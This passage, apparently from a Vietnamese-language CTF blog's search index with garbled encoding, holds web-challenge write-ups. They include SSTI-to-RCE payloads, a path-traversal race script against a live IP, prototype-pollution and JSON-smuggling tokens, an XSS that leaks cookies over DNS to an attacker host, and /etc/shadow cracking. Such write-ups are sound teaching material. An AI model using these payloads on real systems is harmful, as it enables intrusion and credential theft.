\"http://103.163.24.78:8888/?file=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa./../../../../../flag.txt\"def get(id):    r = requests.get(url = f\"http://103.163.24.78:8888/?file=///proc/{id}/fd/10\")    if \"KCSC\" in r.text:        print(r.text)        exit()def start1():    r = requests.get(url = url)if __name__ == \"__main__\":    threading.Thread(target=start1).start()    time.sleep(1)    threading.Thread(target=get, args=(1,)).start()    threading.Thread(target=get, args=(7,)).start()    threading.Thread(target=get, args=(8,)).start()    threading.Thread(target=get, args=(9,)).start()VÃ  ra flag"
  },
  
  {
    "title": "W1 Playground Writeup",
    "url": "/posts/W1Playground/",
    "categories": "CTF Writeup",
    "tags": "Prototype Pollution, SSTI, API testing, XSS, PHP",
    "date": "2024-04-30 23:00:00 +0700",
    





    
    "snippet": "BÃ i 1: easy loginPhÃ¢n tÃ­ch qua code thÃ¬ chÃºng ta cÃ³ 2 endpoint cáº§n Ä‘á»ƒ tÃ¢m lÃ  â€œ/loginâ€ vÃ  â€œ/adminâ€Chá»©c nÄƒng login báº¯t chÃºng ta post data lÃªn vÃ  server sáº½ tráº£ láº¡i mÃ£ jwtkey Ä‘á»ƒ chÃºng ta Ä‘Äƒng nháº­pChá»©c ...",
    "content": "BÃ i 1: easy loginPhÃ¢n tÃ­ch qua code thÃ¬ chÃºng ta cÃ³ 2 endpoint cáº§n Ä‘á»ƒ tÃ¢m lÃ  â€œ/loginâ€ vÃ  â€œ/adminâ€Chá»©c nÄƒng login báº¯t chÃºng ta post data lÃªn vÃ  server sáº½ tráº£ láº¡i mÃ£ jwtkey Ä‘á»ƒ chÃºng ta Ä‘Äƒng nháº­pChá»©c nÄƒng admin kiá»ƒm tra xem chÃºng ta cÃ³ pháº£i admin khÃ´ng qua isAdmin=true sau khi phÃ¢n tÃ­ch jwtkeySau khi phÃ¢n tÃ­ch bÃ i nÃ y dÃ­nh lá»—i Prototype Pollution báº±ng cÃ¡ch thÃªm logindata[\"__proto__\"][isAdmin]=true vÃ o thÃ¬ prototype cá»§a logindata sáº½ cÃ³ thuá»™c tÃ­nh isAdmin=true tá»« Ä‘Ã³ logindata sáº½ káº¿ thá»«a thuá»™c tÃ­nh Ä‘Ã³PayloadCÃ³ jwtkey rá»“i thÃ¬ vÃ o admin Ä‘á»ƒ láº¥y flag thÃ´iFlag : W1{REDACTED}BÃ i 2: render4freePhÃ¢n tÃ­ch qua code thÃ¬ web nÃ y Ä‘ang sá»­ dá»¥ng Pug template engine Ä‘á»ƒ in ra cÃ¡c kÃ½ tá»± chÃºng ta gÃµ vÃ oSau khi phÃ¢n tÃ­ch code thÃ¬ chÃºng ta cÃ³ thá»ƒ rÃºt ra web Ä‘ang dÃ­nh lá»—i SSTI nhÆ°ng cÃ³ 1 function nÃ y Ä‘ang cháº·n chÃºng ta khai thÃ¡c SSTISau khi Ä‘á»c pug document thÃ¬ chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng â€œ-â€œ Ä‘á»ƒ viáº¿t code jsBÃ¢y giá» chÃºng ta cÃ³ thá»ƒ dÃ¹ng â€œ-â€œ Ä‘á»ƒ viáº¿t code js thÃ¬ chÃºng ta viáº¿t gÃ¬ ? ÄÃ³ chÃ­nh lÃ  ghi Ä‘Ã¨ láº¡i function filter kÃ½ tá»± cá»§a chÃºng ta- global.replace_bad_char = str_to_replace =&gt; str_to_replaceTiáº¿p tá»¥c ghi Ä‘Ã¨ láº¡i function trÃªn Ä‘á»ƒ chÃºng ta cÃ³ thá»ƒ thá»±c hiá»‡n lá»‡nh eval- global.replace_bad_char = str_to_replace =&gt; eval(str_to_replace)Sau khi ghi Ä‘Ã¨ Ä‘Æ°á»£c rá»“i thÃ¬ viáº¿t vÃ o Ä‘á»ƒ thá»­ thá»±c hiá»‡n RCE nÃ oPayload require('child_process').exec('ping hacked.sv')LÃ m gÃ¬ dá»… tháº¿ anh Shin24 (author bÃ i nÃ y) Ä‘Ã£ set type cá»§a nodejs lÃ  module tá»©c chÃºng ta khÃ´ng thá»ƒ require mÃ  pháº£i sá»­ dá»¥ng importNhÆ°ng mÃ  code Ä‘Ã£ chá»‰nh Promise.prototype.then Ä‘Ã£ thÃ nh 1 hÃ m tráº£ vá» nullOat gÃ¬ dark váº­y, lÃºc nÃ y chÃºng ta sá»­ dá»¥ng process.binding Ä‘á»ƒ import cÃ¡c modules cá»§a nodejs  process.binding('spawn_sync').spawn({     file: 'ls',    args: [''],    stdio: [        { type: 'pipe', readable: true, writable: false },        { type: 'pipe', readable: false, writable: true },        { type: 'pipe', readable: false, writable: true }  ]}).output.toString()Ngon váº­y lÃ  cÃ³ thá»ƒ thá»±c hiá»‡n lá»‡nh lsÄá»ƒ Ã½ á»Ÿ file Docker author Ä‘Ã£ táº¡o ra 1 file /read_flag Ä‘á»ƒ Ä‘á»c flag váº­y chÃºng ta thá»±c thi file read_flag Ä‘á»ƒ nháº­n flagPayload:  process.binding('spawn_sync').spawn({     file: '/read_flag',    args: [''],    stdio: [        { type: 'pipe', readable: true, writable: false },        { type: 'pipe', readable: false, writable: true },        { type: 'pipe', readable: false, writable: true }  ]}).output.toString()Flag: W1{REDACTED}BÃ i 3: Super sanitizerTÃ³m táº¯t bÃ i web nÃ y sá»­ dá»¥ng WASM Ä‘Æ°á»£c compile tá»« C vÃ  sá»­ dá»¥ng nÃ³ Ä‘á»ƒ xá»­ lÃ½ input cá»§a user  File C nháº­n input cá»§a user vÃ  blacklist Ä‘á»ƒ xá»­ lÃ½ náº¿u cÃ³ kÃ½ tá»± blacklist thÃ¬ kÃ½ tá»± Ä‘Ã³ sáº½ bá»‹ xoÃ¡ khá»i input cá»§a userBlacklist cá»§a bÃ i nÃ y nhÆ° sau &lt;imgoner='\\\"'&gt;Lá»—i cá»§a bÃ i nÃ y náº±m á»Ÿ Ä‘Ã¢yKhi chÃºng ta cho 1 kÃ½ tá»± cÃ³ Ä‘á»™ dÃ i lÃ  0x300 thÃ¬ raw_str[0x300] sáº½ bá»‹ trÃ n vÃ  sáº½ ghi Ä‘Ã¨ lÃªn kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a blacklist lÃ  \\x00 tá»« Ä‘Ã³ blacklist sáº½ trá»Ÿ thÃ nh rá»—ng -&gt; bypass filterNhÆ°ng Ä‘áº¿n Ä‘Ã¢y thÃ¬ váº«n chÆ°a xong, web cÃ³ CSP Ä‘á»ƒ lÃ m XSS khÃ³ hÆ¡nSau má»™t lÃºc fuzzing Ä‘á»ƒ kiá»ƒm tra thÃ¬ dÃ¹ CSP cháº·n redirect nhÆ°ng window.location.href=hackerwebsite.com váº«n resolve dns váº­y ta cÃ³ thá»ƒ táº­n dá»¥ng cÃ¡i nÃ y Ä‘á»ƒ leak flag do flag khÃ¡ dÃ i nÃªn mÃ¬nh leak 2 láº§n Ä‘á»ƒ láº¥y flag (vÃ­ dá»¥ flag.hackerwebsite.com)NhÆ°ng leak kiá»ƒu gÃ¬? MÃ¬nh Ä‘Ã£ thá»­ leak kiá»ƒu btoa(document.cookie)+\".hackerwebsite.com\" nhÆ°ng khi leak thÃ¬ vÃ¬ lÃ½ do báº£o máº­t dns query sáº½ ngáº«u nhiÃªn uppercase hoáº·c lowercase cÃ¡c kÃ½ tá»± lÃ m base64 bá»‹ lá»—i nÃªn nghÄ© sang cÃ¡ch khÃ¡c lÃ  document.cookie.charCodeAt(0-&gt;document.cookie.length-1) Ä‘á»ƒ leak ra tá»«ng kÃ½ tá»± cá»§a flag sang mÃ£ asciiPayload cÃ¡c báº¡n tá»± craft nhÃ©Flag: W1{REACTED}"
  },
  
  {
    "title": "GreyCTF 2024",
    "url": "/posts/GreyCTF/",
    "categories": "CTF Writeup",
    "tags": "MYSQL, Base64",
    "date": "2024-04-21 23:00:00 +0700",
    





    
    "snippet": "No Sql InjectionI asked My friend Jason to build me a new e-commerce website. We just finished the login system and there's already bugs ğŸ¤¦Author: jrohttp://challs.nusgreyhats.org:33336PhÃ¢n tÃ­ch qua...",
    "content": "No Sql InjectionI asked My friend Jason to build me a new e-commerce website. We just finished the login system and there's already bugs ğŸ¤¦Author: jrohttp://challs.nusgreyhats.org:33336PhÃ¢n tÃ­ch qua thÃ¬ bÃ i nÃ y cÃ³ cÃ¡c chá»©c nÄƒng chÃ­nh sau  /api/register/1app.post('/api/register/1', async (req, res) =&gt; {    try {        let { username } = req.body;        username = decode(username);        const token = btoa(JSON.stringify({            name: username,            admin: false        }));        console.log(token);        await query(\"insert into tokens values (?)\", [token]);        res.json({ \"err\": false, \"token\": token });    } catch (err) {        console.log(err);        res.json({ \"err\": true });    }})  /api/register/2app.post('/api/register/2', async (req, res) =&gt; {    try {        let { password, token } = req.body;        password = decode(password);        token = decode(token);        const result = await query(\"select 1 from tokens where token = ?\", [token]);        console.log(result);        if (result.length != 1) {            return res.json({ err: \"Token not found!\" });        }        await query(\"delete from tokens where token = ?\", [token]);        const { name, admin } = JSON.parse(atob(token));        console.log(JSON.parse(atob(token)))        await query(\"insert into users (name, password, admin) values (?, ?, ?)\", [name.toString(), password, admin === true]);        res.json({ \"err\": false });    } catch (err) {        console.log(err);        res.json({ \"err\": true });    }})  /api/loginapp.post('/api/login', async (req, res) =&gt; {    try {        let { password, username } = req.body;        password = decode(password);        username = decode(username);        const result = await query(\"select admin from users where name = ? and password = ?\", [username, password]);        if (result.length != 1) {            return res.json({ err: \"Username or password did not match\" });        }        if(result[0].admin) {            res.json({ \"err\": false, \"msg\": config.flag});        } else {            res.json({ \"err\": false, \"msg\": \"You've logged in successfully, but there's no flag here!\"});        }        // Prevent too many records from filling up the database        await query(\"delete from users where name = ? and password = ?\", [username, password]);    } catch (err) {        console.log(err);        res.json({ \"err\": true });    }})Giáº£i thÃ­ch cÃ¡c api endpoint  /register/1 sáº½ nháº­n username khi chÃºng ta post data, sau Ä‘Ã³báº±ng cÃ¡ch thÃªm vÃ o má»™t key:value - admin:false vÃ o vÃ  chuyá»ƒn sang dáº¡ng json vÃ  base64 encode nÃ³Sau Ä‘Ã³ backend sáº½ thÃªm token nÃ y vÃ o báº£ng tokens vÃ  gá»­i tráº£ ta token nhÆ° trÃªn  /register/2 sáº½ nháº­n password vÃ  token (cáº£ 2 Ä‘á»u Ä‘Ã£ bá»‹ base64) khi chÃºng ta post data, sau Ä‘Ã³ decode cáº£ 2 vÃ  kiá»ƒm tra xem token Ä‘Ã£ cÃ³ trong db chÆ°a, náº¿u cÃ³ thÃ¬ parse nÃ³ thÃ nh json vÃ  láº¥y dá»¯ liá»‡u cá»§a cÃ¡c trÆ°á»ng name, password, adminSau Ä‘Ã³ backend sáº½ xoÃ¡ token nÃ y khá»i database vÃ  thÃªm cÃ¡c trÆ°á»ng trÃªn vÃ o báº£ng users  /login thÃ¬ Ä‘Æ¡n giáº£n chá»‰ lÃ  check xem account cÃ³ pháº£i lÃ  admin khÃ´ng cÃ³ thÃ¬ in ra flag, khÃ´ng thÃ¬ khÃ´ng in gÃ¬ cáº£Váº­y trong nÃ y cÃ³ cÃ¡i gÃ¬ táº­n dá»¥ng Ä‘Æ°á»£c Ä‘á»ƒ khai thÃ¡c ? ThÃ´ng thÆ°á»ng so sÃ¡nh cá»§a mysql lÃ  case-insensitive tá»©c lÃ  â€˜aâ€™ == â€˜Aâ€™ váº­y báº±ng 1 cÃ¡ch nÃ o Ä‘áº¥y chÃºng ta cÃ³ thá»ƒ Ä‘iá»u khiá»ƒn cÃ¡i token cá»§a chÃºng ta vÃ  khi parse nÃ³ thÃ¬ nÃ³ sáº½ ra data má»™t cÃ¡ch khÃ¡c thÆ°á»ngTá»« Ä‘Ã³ token thÃ´ng thÆ°á»ng lÃ {\"name\":\"yuu\",\"admin\":false}Sau khi bá»‹ chÃºng ta chá»‰nh sá»­a vÃ  nÃ³ bá»‹ biáº¿n Ä‘á»•i thÃ nh{\"name\":\"yuu\",\"admin\":true}VÃ¬ chÃºng ta chá»‰ cÃ³ thá»ƒ kiá»ƒm soÃ¡t Ä‘Æ°á»£c giÃ¡ trá»‹ cá»§a username nÃªn chÃºng ta pháº£i lÃ m sao Ä‘Ã³ Ä‘á»ƒ phÃ¡ dáº¥u \" Ä‘á»ƒ áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c Ä‘áº·c tÃ­nh cá»§a JSON á»Ÿ Ä‘Ã¢y Ä‘Ã³ chÃ­nh lÃ  chá»‰nh sá»­a in hoa, in thÆ°á»ng cá»§a cÃ¡c kÃ½ tá»± Ä‘áº¡i diá»‡n cho dÃ¢u \"Sau khi phÃ¡ Ä‘Æ°á»£c dáº¥u \" vÃ  viáº¿t Ä‘Æ°á»£c admin = true thÃ¬ chÃºng ta váº«n cÃ²n 1 viá»‡c ná»¯a pháº§n admin = false á»Ÿ phÃ­a sau váº«n cÃ²n vÃ  sáº½ ghi Ä‘Ã¨ giÃ¡ trá»‹ admin á»Ÿ trÆ°á»›c, lÃºc nÃ y chÃºng ta cÃ³ thá»ƒ tiáº¿p tá»¥c phÃ¡ giÃ¡ trá»‹ cá»§a admin = false á»Ÿ sau báº±ng cÃ¡ch chá»‰nh láº¡i kÃ½ tá»± in hoa -&gt; thÆ°á»ng cá»§a kÃ½ tá»± Ä‘áº¡i diá»‡n cho giÃ¡ trá»‹ adminVÃ  cÃ³ 1 Ä‘iá»u cáº§n lÆ°u Ã½ lÃ  JSON.stringify khi parse cÃ¡c JSON object náº¿u cÃ¡c kÃ½ tá»± Ä‘Ã³ khÃ´ng thá»ƒ decode qua UTF-8 hay UTF-16 thÃ¬ nÃ³ sáº½ tráº£ vá» unicode code vÃ  escape nÃ³ vÃ­ dá»¥ (JSON.stringify('\\uDF06') -&gt; '\"\\\\udf06\"' )Váº­y chÃºng ta vá»«a corrupt cÃ¡i base64 token vÃ  kiá»ƒm tra xem cÃ¡c kÃ½ tá»± Ä‘Ã³ cÃ³ thá»ƒ decode qua UTF-8 hay UTF-16 khÃ´ngDÆ°á»›i Ä‘Ã¢y lÃ  má»™t cÃ¡ch mÃ¬nh tÃ¬m Ä‘Æ°á»£csafe : b'{\"name\":\"yuu (\\xac\\x8aadmin\\x8a:true-\\xc2c\\x8a3\\xa2to\",\"admin\":false}',malicious: b'{\"name\":\"yuu \",\"admin\":true,\"c\":\"to\",\"admOn\":false}'2 base64 cá»§a payload trÃªnsafe: eyJuYW1lIjoieXV1ICisimFkbWluijp0cnVlLcJjijOidG8iLCJhZG1PbiI6ZmFsc2V9,malicious: eyJuYW1lIjoieXV1ICIsImFkbWluIjp0cnVlLCJjIjoidG8iLCJhZG1PbiI6ZmFsc2V9Login báº±ng username á»Ÿ trÃªn (trong trÆ°á»ng há»£p payload cá»§a mÃ¬nh lÃ  yuu ) vÃ  password ta cÃ³ flag"
  },
  
  {
    "title": "PicoCTF 2024",
    "url": "/posts/PicoCTF2024/",
    "categories": "CTF Writeup",
    "tags": "NoSQL, Bypass Filter, PHP Webshell, Symlink",
    "date": "2024-03-27 23:00:00 +0700",
    





    
    "snippet": "PicoCTF2024 Ä‘Ã£ káº¿t thÃºc, giáº£i nÃ y mÃ¬nh cÃ³ khÃ¡ nhiá»u nuá»‘i tiáº¿c vÃ¬ bÃ i cuá»‘i web quÃ¡ khÃ³, dÃ¹ khÃ´ng clear nhÆ°ng team Zafk1el tá»¥i mÃ¬nh Ä‘Ã£ cá»‘ gáº¯ng háº¿t sá»©c. Tiá»‡n Ä‘Ã¢y mÃ¬nh viáº¿t writeup má»™t sá»‘ bÃ i Ä‘Ã¡ng chÃº ...",
    "content": "PicoCTF2024 Ä‘Ã£ káº¿t thÃºc, giáº£i nÃ y mÃ¬nh cÃ³ khÃ¡ nhiá»u nuá»‘i tiáº¿c vÃ¬ bÃ i cuá»‘i web quÃ¡ khÃ³, dÃ¹ khÃ´ng clear nhÆ°ng team Zafk1el tá»¥i mÃ¬nh Ä‘Ã£ cá»‘ gáº¯ng háº¿t sá»©c. Tiá»‡n Ä‘Ã¢y mÃ¬nh viáº¿t writeup má»™t sá»‘ bÃ i Ä‘Ã¡ng chÃº Ã½ trong giáº£i nÃ y.GENERAL SKILLS: dont-you-love-bannersCan you abuse the banner?The server has been leaking some crucial information on tethys.picoctf.net 64560. Use the leaked information to get to the server.To connect to the running application use nc tethys.picoctf.net 64699. From the above information abuse the machine and find the flag in the /root directory.CÃCH 1: symlinkTrÆ°á»›c háº¿t thÃ¬ tráº£ lá»i vÃ i cÃ¢u há»i Ä‘á»ƒ Ä‘Æ°á»£c vÃ o Ä‘Æ°á»£c shell cá»§a playerKhi mÃ¬nh vÃ o Ä‘Æ°á»£c shell thÃ¬ báº¯t Ä‘áº§u lÆ°á»£n qua cÃ¡c folder, mÃ´ táº£ cá»§a bÃ i báº£o hÃ£y tÃ¬m cÃ¡ch Ä‘á»c flag á»Ÿ folder /root nÃªn mÃ¬nh cd Ä‘áº¿n folder Ä‘Ã³ Ä‘á»ƒ xemTáº¥t nhiÃªn lÃ  lÃ m gÃ¬ cÃ³ chuyá»‡n dá»… tháº¿, flag Ä‘Ã£ bá»‹ giá»›i háº¡n quyá»n chá»‰ cÃ³ root má»›i cÃ³ quyá»n Ä‘á»cVáº­y lÃ m gÃ¬ bÃ¢y giá» ? LÃºc nÃ y mÃ¬nh má»›i Ä‘á»ƒ Ã½ cÃ³ file script.py nÃªn mÃ¬nh má»Ÿ lÃªn xem, Ä‘Ã¢y lÃ  ná»™i dung file script.pyimport osimport ptyincorrect_ans_reply = \"Lol, good try, try again and good luck\\n\"if __name__ == \"__main__\":    try:      with open(\"/home/player/banner\", \"r\") as f:        print(f.read())    except:      print(\"*********************************************\")      print(\"***************DEFAULT BANNER****************\")      print(\"*Please supply banner in /home/player/banner*\")      print(\"*********************************************\")try:    request = input(\"what is the password? \\n\").upper()    while request:        if request == 'MY_PASSW@RD_@1234':            text = input(\"What is the top cyber security conference in the world?\\n\").upper()            if text == 'DEFCON' or text == 'DEF CON':                output = input(                    \"the first hacker ever was known for phreaking(making free phone calls), who was it?\\n\").upper()                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':                    scmd = 'su - player'                    pty.spawn(scmd.split(' '))                else:                    print(incorrect_ans_reply)            else:                print(incorrect_ans_reply)        else:            print(incorrect_ans_reply)            breakexcept:    KeyboardInterruptTrong file nÃ y thÃ¬ khÃ´ng cÃ³ gÃ¬ Ä‘Ã¡ng chÃº Ã½ trá»« 2 Ä‘iá»ƒm  File nÃ y cháº¡y dÆ°á»›i quyá»n root  File nÃ y Ä‘á»c ná»™i dung 1 tá»‡p tin lÃ  /home/player/bannerLÃºc nÃ y thÃ¬ ta rÃºt ra dÃ¹ng symlink Ä‘á»ƒ /home/player/banner trá» Ä‘á»ƒn /root/flag.txt vÃ  Ä‘á»c Ä‘Æ°á»£c flagBÃ¢y giá» chá»‰ cáº§n nc láº¡i server thÃ¬ script.py sáº½ tá»± Ä‘á»™ng Ä‘á»c flag in ra cho taCÃCH 2: crack passworkTrong bÃ i nÃ y chÃºng ta ngoÃ i quyá»n Ä‘á»c 1 sá»‘ file máº·c Ä‘á»‹nh thÃ¬ chÃºng ta láº¡i Ä‘Æ°á»£c cáº¥p quyá»n Ä‘á»c file /etc/shadow, file nÃ y lÃ  file quan trá»ng chá»©a password cá»§a táº¥t cáº£ user ( Ä‘Ã£ bá»‹ mÃ£ hoÃ¡ ) váº­y náº¿u chÃºng ta cÃ³ thá»ƒ decrypt láº¡i thÃ¬ chÃºng ta sáº½ cÃ³ password vÃ  thÄƒng lÃªn quyá»n rootVá» cÃ¡ch crack password thÃ¬ mÃ¬nh sá»­ dá»¥ng tool hashcat Ä‘á»ƒ crack ra passwordCÃ¡ch nÃ y thÃ¬ mÃ¬nh khÃ´ng Ä‘Ã¡nh giÃ¡ cao láº¯m vÃ¬ nhÃ¬n hÆ¡i cÃ¹i &lt;(â€œ) nhÆ°ng mÃ  nÃ³ cÅ©ng lÃ  má»™t cÃ¡chFunfact: Trong lÃºc lÃ m bÃ i nÃ y mÃ¬nh Ä‘Ã£ ngáº«u nhiÃªn gÃµ Ä‘Ãºng password cá»§a root trong ngay láº§n Ä‘áº§u tiÃªn, sau Ä‘Ã³ mÃ¬nh má»›i dÃ¹ng cÃ¡ch symlinkFlag: picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23}GENERAL SKILLS: SansAlphaThe Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols.Additional details will be available after launching your challenge instance.BÃ i nÃ y cháº·n táº¥t cáº£ cÃ¡c chá»¯ cÃ¡i vÃ  1 sá»‘ kÃ½ tá»± Ä‘áº·c biá»‡t, chá»‰ cÃ³ thá»ƒ xÃ i sá»‘ vÃ  cÃ¡c kÃ½ tá»± Ä‘áº·c biá»‡t. BÃ i nÃ y sau má»™t lÃºc suy nghÄ© thÃ¬ mÃ¬nh nghÄ© theo hÆ°á»›ng wildcards vÃ  tÃ¬m ra 2 cÃ¡ch khÃ¡ hayCÃ¡ch 1: Sá»­ dá»¥ng base32Sau má»™t lÃºc fuzzing thÃ¬ mÃ¬nh tÃ¬m tháº¥y file flag.txt á»Ÿ ./blargh/flag.txtTiáº¿p theo chÃºng ta cáº§n tÃ¬m cÃ¡ch Ä‘á»c flag. Äá»ƒ thá»±c thi Ä‘Æ°á»£c lá»‡nh thÃ¬ trong lá»‡nh Ä‘Ã³ chá»‰ cÃ³ thá»ƒ cÃ³ kÃ½ tá»± Ä‘áº·c biá»‡t vÃ  sá»‘, káº¿t há»£p wildcard chÃºng ta chá»‰ cáº§n tÃ¬m nhá»¯ng lá»‡nh cÃ³ sá»‘ lÃ  Ä‘Æ°á»£c. Sau Ä‘Ã³, mÃ¬nh tÃ¬m Ä‘Æ°á»£c 2 lá»‡nh cÃ³ thá»ƒ dÃ¹ng Ä‘Æ°á»£c Ä‘Ã³ lÃ  base64 vÃ  base32NhÆ°ng cÃ³ má»™t váº¥n Ä‘á» Ä‘Ã³ lÃ  base64 khi dÃ¹ng wildcard láº¡i trÃ¹ng vá»›i má»™t tá»‡p thá»±c thi khÃ¡c /usr/bin/x86_64 váº­y thÃ¬ cÃ²n láº¡i base32 cÃ³ váº» kháº£ thiChÃºng ta cÃ³ thá»ƒ dÃ¹ng wildcard gá»i ra file base32 nhÆ° sau /???/???/????32 vÃ  flag thÃ¬ cÃ³ Ä‘á»‹a chá»‰ á»Ÿ trÃªn rá»“i bÃ¢y giá» káº¿t há»£p láº¡i Ä‘á»ƒ Ä‘á»c flag.txt.Decode base32 sex ra flagCÃ¡ch 2: Sá»­ dá»¥ng stringsLÃºc nÃ£y mÃ¬nh má»›i nÃ³i lÃ  chá»‰ cÃ³ thá»ƒ gá»i ra file thá»±c thi cÃ³ sá»‘ thÃ´i mÃ  lá»‡nh strings thÃ¬ lÃ m gÃ¬ cÃ³ sá»‘ Ä‘á»ƒ mÃ  gá»i =))) tháº­t ra lÃ  cÃ³ má»™t cÃ¡ch nhÆ°ng cÃ¡ch nÃ y chá»‰ gá»i Ä‘Æ°á»£c ráº¥t giá»›i háº¡nBáº±ng cÃ¡ch táº­n dá»¥ng tham sá»‘ special bash ta cÃ³ thá»ƒ gá»i ra má»™t sá»‘ kÃ½ tá»±, nhÆ° á»Ÿ challenge hiá»‡n táº¡i chÃºng ta cÃ³ dÃ¹ng $- Ä‘á»ƒ gá»i ra cÃ¡c kÃ½ tá»± sau 'h', 'i', 'm', 'B', 'H', 's'Giáº£i thÃ­ch ngáº¯n gá»n thÃ¬ $- lÃ  tá»•ng há»£p cÃ¡c flag Ä‘Æ°á»£c thiáº¿t láº­p cho shell bash hiá»‡n táº¡i, nhÆ° shell á»Ÿ trÃªn thÃ¬ Ã½ nghÄ©a tá»«ng kÃ½ tá»± nhÆ° sauH - histexpand: ÄÃ¢y lÃ  flag cho phÃ©p chÃºng ta láº¥y nhá»¯ng gÃ¬ chÃºng ta Ä‘Ã£ nháº­p bá» vÃ o input Ä‘á»ƒ tiáº¿p tá»¥c thá»±c hiá»‡n lá»‡nh, cho phÃ©p chÃºng ta dá»… dÃ ng nháº­p vÃ  láº·p láº¡i lá»‡nhm - monitor: ÄÃ¢y lÃ  flag liÃªn quan Ä‘áº¿n job control, giÃºp chÃºng ta theo dÃµi cÃ¡c job trong shellh - hashall: ÄÃ¢y lÃ  flag Ä‘Æ°á»£c báº­t lÃªn máº·c Ä‘á»‹nh, nÃ³ giÃºp lÆ°u trá»¯ cÃ¡c lá»‡nh mÃ  ta thÆ°á»ng xÃ i Ä‘á»ƒ giÃºp tÄƒng tá»‘c tá»‘c Ä‘á»™ thá»±c thi chÆ°Æ¡ng trÃ¬nhB - braceexpand: ÄÃ¢y lÃ  flag lÃ m cho shell cÃ³ thá»ƒ sá»­ dá»¥ng brace expansioni - interactive: ÄÃ¢y lÃ  flag khi mÃ  shell cÃ³ thá»ƒ tÆ°Æ¡ng tÃ¡c Ä‘Æ°á»£cCÃ³ thá»ƒ Ä‘á»c thÃªm táº¡i Ä‘Ã¢y LINKBÃ¢y giá» dá»±a vÃ o Ä‘Ã³, chÃºng ta cÃ³ thá»ƒ gÃ¡n giÃ¡ trá»‹ Ä‘Ã³ vÃ o má»™t biáº¿n khÃ¡c Ä‘á»ƒ dá»… dÃ ng sá»­ dá»¥ng hÆ¡n mÃ¬nh sá»­ dá»¥ng biáº¿n ____ Ä‘á»ƒ láº¥y giÃ¡ trá»‹ $-LÃºc nÃ y mÃ¬nh kiá»ƒm tra Ä‘Ã£ gÃ¡n thÃ nh cÃ´ng bÃ¢y giá» Ä‘áº¿n bÆ°á»›c láº¥y kÃ½ tá»± trong Ä‘Ã³ ra báº±ng ${____:index:len}Sau khi Ä‘Ã¡nh giÃ¡ cÃ¡c lá»‡nh cÃ³ thá»ƒ mÃ¬nh Ä‘Ã£ chá»n lá»‡nh strings Ä‘á»ƒ sá»­ dá»¥ng, dá»±a vÃ o cÃ¡c dá»¯ kiá»‡n á»Ÿ trÃªn mÃ¬nh cÃ³ thá»ƒ craft Ä‘Æ°á»£c payload nhÆ° sau /?${____:5:1}?/???/${____:5:1}??${____:1:1}??${____:5:1} (/?s?/???/s??i??s)LÃºc nÃ y chÃºng ta gáº§n nhÆ° cÃ³ Ä‘Æ°á»£c lá»‡nh ls (fake) vÃ  cat (fake) vá»›i lá»‡nh nÃ y ta cÃ³ thá»ƒ Ä‘á»c báº¥t ká»³ file nÃ o náº¿u biáº¿t Ä‘á»‹a chá»‰Äá»c flagFlag: picoCTF{7h15_mu171v3r53_15_m4dn355_36a674c0}WEB EXPLOITATION: No Sql InjectionCan you try to get access to this website to get the flag?You can download the source here.The website is running here. Can you log in?App sá»­ dá»¥ng MongoDB, sá»­ dá»¥ng phÆ°Æ¡ng thá»©c POST Ä‘á»ƒ gá»­i giÃ¡ trá»‹ email vÃ  password lÃªnBÃ i nÃ y chá»‰ cÃ³ 2 chá»• cáº§n chÃº Ã½  Táº¡i /api/login/route.ts cÃ³ 1 Ä‘oáº¡n lá»‡nh nhÆ° sau       const users = await User.find({  email: email.startsWith(\"{\") &amp;&amp; email.endsWith(\"}\") ? JSON.parse(email) : email,  password: password.startsWith(\"{\") &amp;&amp; password.endsWith(\"}\") ? JSON.parse(password) : password});if (users.length &lt; 1)  return new Response(\"Invalid email or password\", { status: 401 },users);else {  return new Response(JSON.stringify(users), { status: 200 });}        VÃ  táº¡i /models/user.ts cÃ³ Ä‘oáº¡n lá»‡nh      const UserSchema: Schema = new Schema({email: { type: String, required: true, unique: true },firstName: { type: String, required: true },lastName: { type: String, required: true },password: { type: String, required: true },token: { type: String, required: false ,default: \"\"},  });  const User = models.User || mongoose.model&lt;UserInterface&gt;(\"User\", UserSchema);      Táº¡i route.ts Ä‘oáº¡n code sáº½ kiá»ƒm tra xem náº¿u biáº¿n email vÃ  password truyá»n vÃ o báº¯t Ä‘áº§u báº±ng â€˜{â€˜ vÃ  káº¿t thÃºc báº±ng â€˜}â€™ thÃ¬ parse cÃ¡i JSON Ä‘Ã³ ra cÃ²n ngÆ°á»£c láº¡i thÃ¬ truyá»n vÃ o nguyÃªn giÃ¡ trá»‹ Ä‘Ã³ vÃ  náº¿u login vÃ o thÃ nh cÃ´ng sáº½ tráº£ vá» usersTáº¡i user.ts Ä‘oáº¡n code trÃªn gÃ¡n má»™t key lÃ  token vá»›i value máº·c Ä‘á»‹nh lÃ  FLAGMongoDB thÃ¬ cÃ³ thá»ƒ thÃªm má»™t 